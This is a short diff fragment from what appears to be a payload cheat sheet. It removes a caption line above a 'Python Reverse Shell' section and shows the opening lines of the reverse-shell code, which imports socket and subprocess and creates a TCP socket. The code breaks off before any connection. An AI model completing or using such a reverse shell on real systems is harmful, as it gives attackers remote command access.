@@ -31,9 +31,6 @@ JavaScript strings can be escaped:
 
 ## Python Reverse Shell
 
-Create Python reverse shell
-
-shell.py
 ```
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
